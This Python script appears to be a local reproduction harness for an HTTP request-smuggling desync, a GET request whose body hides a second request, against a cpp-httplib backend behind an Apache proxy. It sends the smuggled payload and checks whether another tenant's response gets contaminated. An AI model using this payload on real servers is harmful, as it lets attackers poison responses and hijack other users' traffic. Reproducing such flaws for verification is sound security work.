#!/usr/bin/env python3
"""Run cpp-httplib's published GET-body desync pattern behind Apache."""

from __future__ import annotations

import argparse
import os
import socket
import subprocess
import tempfile
import time
from pathlib import Path


def wait_for_port(host: str, port: int, process: subprocess.Popen[str]) -> None:
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return
        except OSError:
            if process.poll() is not None:
                raise RuntimeError(process.stderr.read())
    raise TimeoutError(f"{host}:{port} did not listen")


def read_response(sock: socket.socket) -> bytes:
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            return data
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length = next((int(line.split(b":", 1)[1]) for line in head.split(b"\r\n")
                   if line.lower().startswith(b"content-length:")), 0)
    while len(body) < length:
        chunk = sock.recv(8192)
        if not chunk:
            break
        body += chunk
    return head + b"\r\n\r\n" + body[:length]


def one_run(args: argparse.Namespace, backend_binary: Path) -> bool:
    with tempfile.TemporaryDirectory(prefix="cpp-httplib-apache-") as tmp:
        root = Path(tmp)
        webroot = root / "web"
        webroot.mkdir()
        (webroot / "index.html").write_text("A-ORIGINAL\n")
        backend_port = 19080
        backend = subprocess.Popen(
            [str(backend_binary), str(backend_port), str(webroot)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env={**os.environ},
        )
        config = root / "httpd.conf"
        config.write_text(f"""\
ServerRoot "{args.server_root}"
Listen 127.0.0.1:18080
PidFile "{root / 'httpd.pid'}"
ErrorLog "{root / 'error.log'}"
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
ProxyPass / http://127.0.0.1:{backend_port}/
ProxyPassReverse / http://127.0.0.1:{backend_port}/
""")
        apache = subprocess.Popen(
            [str(args.httpd), "-f", str(config), "-DFOREGROUND", "-X"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            env={**os.environ, "APACHE_RUN_DIR": str(root)},
        )
        try:
            wait_for_port("127.0.0.1", backend_port, backend)
            wait_for_port("127.0.0.1", 18080, apache)
            smuggled = (
                b"GET /delay?tag=ATTACKER_ONLY HTTP/1.1\r\n"
                b"Host: tenant-a\r\n"
                b"Connection: keep-alive\r\n\r\n"
            )
            attacker_request = (
                b"GET /index.html HTTP/1.1\r\n"
                b"Host: tenant-a\r\nContent-Length: " + str(len(smuggled)).encode() +
                b"\r\nConnection: keep-alive\r\n\r\n" + smuggled
            )
            with socket.create_connection(("127.0.0.1", 18080), timeout=5) as attacker:
                attacker.sendall(attacker_request)
                response_a = read_response(attacker)
            with socket.create_connection(("127.0.0.1", 18080), timeout=5) as victim:
                victim.sendall(
                    b"GET /victim HTTP/1.1\r\nHost: tenant-b\r\n"
                    b"Connection: close\r\n\r\n"
                )
                response_b = read_response(victim)
            contaminated = b"ATTACKER-ATTACKER_ONLY" in response_b
            backend.terminate()
            backend.wait(timeout=5)
            backend_log = backend.stderr.read()
            print(f"cpp_httplib_response_a={response_a!r}")
            print(f"cpp_httplib_response_b={response_b!r}")
            print(f"cpp_httplib_backend_log={backend_log!r}")
            print(f"cpp_httplib_apache_boundary={'observed' if contaminated else 'not_observed'}")
            return contaminated
        finally:
            apache.terminate()
            backend.terminate()
            for process in (apache, backend):
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--backend", required=True, type=Path)
    args = parser.parse_args()
    one_run(args, args.backend)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
